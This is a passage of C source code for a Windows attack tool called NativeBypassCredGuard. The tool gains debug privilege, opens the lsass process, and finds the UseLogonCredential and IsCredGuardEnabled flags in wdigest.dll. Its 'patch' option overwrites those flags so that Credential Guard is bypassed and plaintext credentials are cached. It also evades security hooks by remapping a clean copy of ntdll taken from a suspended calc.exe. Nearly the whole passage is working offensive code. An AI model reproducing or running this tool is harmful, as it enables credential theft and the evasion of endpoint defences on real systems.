    NTSTATUS vp_res_2 = NtProtectVirtualMemory(currentProcess, &localNtdllTxt, &aux, dwOldProtection, &dwOldProtection);
    if (vp_res_2 != 0) {
        // if (!VirtualProtect(localNtdllTxt, localNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
        printf("[-] Error calling NtProtectVirtualMemory (dwOldProtection)\n");
        ExitProcess(0);
    }
}


void RemapNtdll(HANDLE hProcess) {
    const char* targetDll = "ntdll.dll";
    long long unhookedNtdllTxt = (long long)MapNtdllFromSuspendedProc(hProcess);
    HANDLE currentProcess = (HANDLE)(-1);
    uintptr_t localNtdllHandle = CustomGetModuleHandle(currentProcess, targetDll);
    int* textSectionInfo = GetTextSectionInfo((void*)localNtdllHandle);
    int localNtdllTxtBase = textSectionInfo[0];
    int localNtdllTxtSize = textSectionInfo[1];
    long long localNtdllTxt = (long long)localNtdllHandle + localNtdllTxtBase;
    ReplaceNtdllTxtSection((LPVOID)unhookedNtdllTxt, (LPVOID)localNtdllTxt, localNtdllTxtSize);
}


// Concatenate chars and return wchar_t*
wchar_t* get_concatenated_wchar_t(const char* str1, const char* str2, bool add_space) {
    size_t len1 = strlen(str1);
    size_t len2 = strlen(str2);
    size_t total_len = len1 + len2 + 1;
    if (add_space) {
        total_len += 1;
    }
    wchar_t* result = (wchar_t*)malloc(total_len * sizeof(wchar_t));
    if (!result) return NULL;
    for (size_t i = 0; i < len1; i++) {
        result[i] = (wchar_t)(unsigned char)str1[i];
    }
    if (add_space) {
        result[len1] = L' ';
    }
    for (size_t i = 0; i < len2; i++) {
        if (add_space) {
            result[len1 + 1 + i] = (wchar_t)(unsigned char)str2[i];
        }
        else {
            result[len1 + i] = (wchar_t)(unsigned char)str2[i];
        }
    }
    result[total_len - 1] = L'\0';
    return result;
}


// Custom implementation for GetProcessHeap - NtQueryInformationProcess + NtReadVirtualMemory
HANDLE CustomGetProcessHeap() {
    const int process_basic_information_size = 48;
    int peb_offset = 0x8;
    BYTE pbi_byte_array[process_basic_information_size];
    void* pbi_addr = (void*)pbi_byte_array;
    ULONG ReturnLength;
    NTSTATUS ntstatus = NtQueryInformationProcess((HANDLE)-1, ProcessBasicInformation, pbi_addr, process_basic_information_size, &ReturnLength);
    void* peb_pointer = (void*)((uintptr_t)pbi_addr + peb_offset);
    void* pebaddress = *(void**)peb_pointer;
    void* processHeapAddress = (void*)((uintptr_t)pebaddress + 0x30);
    HANDLE heapHandle = NULL;
    SIZE_T bytesRead;
    ntstatus = NtReadVirtualMemory((HANDLE)-1, processHeapAddress, &heapHandle, sizeof(heapHandle), &bytesRead);
    return (ntstatus == 0) ? heapHandle : NULL;
}


// Create process: RtlCreateProcessParametersEx + NtCreateUserProcess
HANDLE CreateSuspProc(char* process_path) {
    // Create process parameters
    UNICODE_STRING NtImagePath;
    RtlInitUnicodeString(&NtImagePath, get_concatenated_wchar_t("\\??\\", process_path, false));
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
    NTSTATUS ntstatus = RtlCreateProcessParametersEx(
        &ProcessParameters,
        &NtImagePath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL,
        1
    );
    if (ntstatus != 0) {
        printf("[+] RtlCreateProcessParametersEx failed\n");
        return NULL;
    }
    printf("[+] RtlCreateProcessParameters:\ttrue\n");

    // Create the process
    PS_CREATE_INFO CreateInfo = { 0 };
    CreateInfo.Size = sizeof(CreateInfo);
    CreateInfo.State = PsCreateInitialState;
    PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(
        CustomGetProcessHeap(),
        HEAP_ZERO_MEMORY,
        sizeof(PS_ATTRIBUTE_LIST) + sizeof(PS_ATTRIBUTE) * 1);
    AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
    AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    AttributeList->Attributes[0].Size = NtImagePath.Length;
    AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;
    HANDLE hProcess = NULL, hThread = NULL;
    ULONG threadFlags = 0x00000001;
    ntstatus = NtCreateUserProcess(
        &hProcess,
        &hThread,
        PROCESS_ALL_ACCESS,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        NULL,
        threadFlags,
        ProcessParameters,
        &CreateInfo,
        AttributeList
    );
    if (ntstatus != 0) {
        printf("[-] NtCreateUserProcess failed\n");
        RtlFreeHeap(CustomGetProcessHeap(), 0, AttributeList);
        RtlDestroyProcessParameters(ProcessParameters);
        return NULL;
    }
    printf("[+] NtCreateUserProcess:\ttrue\n");

    // Clean up
    RtlFreeHeap(CustomGetProcessHeap(), 0, AttributeList);
    RtlDestroyProcessParameters(ProcessParameters);
    return hProcess;
}


void exec(const char* option, bool debug) {
    const char* dllName = "wdigest.DLL";
    wchar_t filePath[MAX_PATH] = L"\\??\\C:\\Windows\\System32\\wdigest.dll";
    const char* proc_name = "c:\\windows\\system32\\lsass.exe";

    bool privilege_bool = EnableDebugPrivileges();
    if (debug && privilege_bool) {
        printf("[+] Enable SeDebugPrivilege: \tOK\n");
    }

    HANDLE fileHandle;

    // Open file
    bool openfile_bool = OpenFile(filePath, &fileHandle);
    if (debug && openfile_bool) {
        printf("[+] File Handle:\t\t%lld\n", (intptr_t)fileHandle);
    }

    // Read bytes
    BYTE* fileBuffer = ReadDLL(fileHandle);
    if (fileBuffer == NULL) {
        printf("[-] Failed to read DLL.\n");
        return;
    }

    int offset = 0;
    int useLogonCredential = 0;
    int isCredGuardEnabled = 0;
    BYTE matchedBytes[18] = { 0 };

    // Parse PE File
    bool parse_bool = ParsePEFile(fileBuffer, 1024 * 1024, &offset, &useLogonCredential, &isCredGuardEnabled, matchedBytes);
    if (!parse_bool) {
        parse_bool = ParsePEFile(fileBuffer, 1024 * 1024, &offset, &useLogonCredential, &isCredGuardEnabled, matchedBytes);
        if (!parse_bool) {
            printf("[-] Failed to parse PE file.\n");
            return;
        }
    }

    int useLogonCredential_Offset = useLogonCredential + offset + 6;
    int isCredGuardEnabled_Offset = isCredGuardEnabled + offset + 12;
    if (debug) {
        printf("[+] Matched Bytes: \t\t");
        for (int i = 0; i < 18; i++) {
            printf("%02X ", matchedBytes[i]);
        }
        printf("\n");
        printf("[+] Offset: \t\t\t0x%X\n", offset);
        printf("[+] UseLogonCredential offset: \t0x%X (0x%X + offset +  6)\n", useLogonCredential_Offset, useLogonCredential);
        printf("[+] IsCredGuardEnabled offset: \t0x%X (0x%X + offset +  6)\n", isCredGuardEnabled_Offset, isCredGuardEnabled);
    }

    HANDLE lsassHandle = GetProcessByName(proc_name);
    if (lsassHandle == 0) {
        printf("[-] It was not possible to get lsass handle.");
        exit(0);
    }
    if (debug) {
        printf("[+] Lsass Handle:\t\t%lld\n", (long long)lsassHandle);
    }

    uintptr_t hModule = CustomGetModuleHandle(lsassHandle, dllName);
    // Other option is LoadLibrary: much simpler but there is not an equivalent in ntdll :(
    // uintptr_t hModule = (uintptr_t)LoadLibraryA("wdigest.dll");
    uintptr_t useLogonCredential_Address = hModule + useLogonCredential_Offset;
    uintptr_t isCredGuardEnabled_Address = hModule + isCredGuardEnabled_Offset;
    if (debug) {
        printf("[+] DLL Base Address: \t\t0x%llX\n", (unsigned long long)hModule);
        printf("[+] UseLogonCredential address:\t0x%llX (0x%llX + 0x%X)\n", (unsigned long long)useLogonCredential_Address, (unsigned long long)hModule, useLogonCredential_Offset);
        printf("[+] IsCredGuardEnabled address:\t0x%llX (0x%llX + 0x%X)\n", (unsigned long long)isCredGuardEnabled_Address, (unsigned long long)hModule, isCredGuardEnabled_Offset);
    }

    if (option == "patch") {
        // Write
        uint32_t useLogonCredential_Value = 1;
        uint32_t isCredGuardEnabled_Value = 0;
        bool setval_bool = SetValue(lsassHandle, (void*)useLogonCredential_Address, useLogonCredential_Value);
        if (debug && setval_bool)
        {
            printf("[+] Wrote value %d to address: \t0x%llX (useLogonCredential)\n", useLogonCredential_Value, useLogonCredential_Address);
        }
        setval_bool = SetValue(lsassHandle, (void*)isCredGuardEnabled_Address, isCredGuardEnabled_Value);
        if (debug && setval_bool)
        {
            printf("[+] Wrote value %d to address: \t0x%llX (isCredGuardEnabled)\n", isCredGuardEnabled_Value, isCredGuardEnabled_Address);
        }
    }


    // Read
    BYTE useLogonCredential_buffer[4] = { 0 };
    BYTE isCredGuardEnabled_buffer[4] = { 0 };
    bool readval_ulcr_bool = ReadValues(lsassHandle, (void*)useLogonCredential_Address, useLogonCredential_buffer, 4);
    bool readval_icge_bool = ReadValues(lsassHandle, (void*)isCredGuardEnabled_Address, isCredGuardEnabled_buffer, 4);

    if (debug && readval_ulcr_bool)
    {
        printf("[+] UseLogonCredential value: \t%02X %02X %02X %02X\n", useLogonCredential_buffer[0], useLogonCredential_buffer[1], useLogonCredential_buffer[2], useLogonCredential_buffer[3]);
    }
    if (debug && readval_icge_bool)
    {
        printf("[+] isCredGuardEnabled value: \t%02X %02X %02X %02X\n", isCredGuardEnabled_buffer[0], isCredGuardEnabled_buffer[1], isCredGuardEnabled_buffer[2], isCredGuardEnabled_buffer[3]);
    }


    if (fileHandle != NULL) {
        NtClose(fileHandle);
    }
    free(fileBuffer);
    return;
}


void help() {
    printf("[+] Usage:\n    NativeBypassCredGuard.exe <OPTION> <REMAPNTDLL>\n\n    OPTION:\n        - 'check': Read current values.\n        - 'patch': Write new values.\n\n    REMAPNTDLL:\n        - true: Remap the ntdll library.\n        - false (or omitted): Do not remap the ntdll library.\n\n    Examples:\n        1. NativeBypassCredGuard.exe check\n           - Reads current values without remapping the ntdll library.\n        2. NativeBypassCredGuard.exe patch true\n           - Writes new values and remaps the ntdll library.\n");
}



int main(int argc, char* argv[]) {
    initializeFunctions();
    bool debug = true;

    if (!is64BitProcess()) {
        printf("[-] File must be compiled as 64-bit binary.\n");
        return 1;
    }

    if (argc < 2) {
        help();
        return 1;
    }

    if (debug) {
        printf("[+] Debug messages:\t\t%s\n", debug ? "true" : "false");
    }

    char* firstArg = argv[1];
    for (char* p = firstArg; *p; ++p) *p = tolower(*p); // Convert to lowercase

    if (strcmp(firstArg, "check") == 0) {
        if (argc == 3 && strcmp(argv[2], "true") == 0) {
            // Create suspended process
            char* process_to_create = (char*)"c:\\Windows\\System32\\calc.exe";
            HANDLE hProcess = CreateSuspProc(process_to_create);
            RemapNtdll(hProcess);
        }
        exec("check", debug);
    }
    else if (strcmp(firstArg, "patch") == 0) {
        if (argc == 3 && strcmp(argv[2], "true") == 0) {
            // Create suspended process
            char* process_to_create = (char*)"c:\\Windows\\System32\\calc.exe";
            HANDLE hProcess = CreateSuspProc(process_to_create);
            RemapNtdll(hProcess);
        }
        exec("patch", debug);
    }
    else {
        help();
    }

    return 0;
}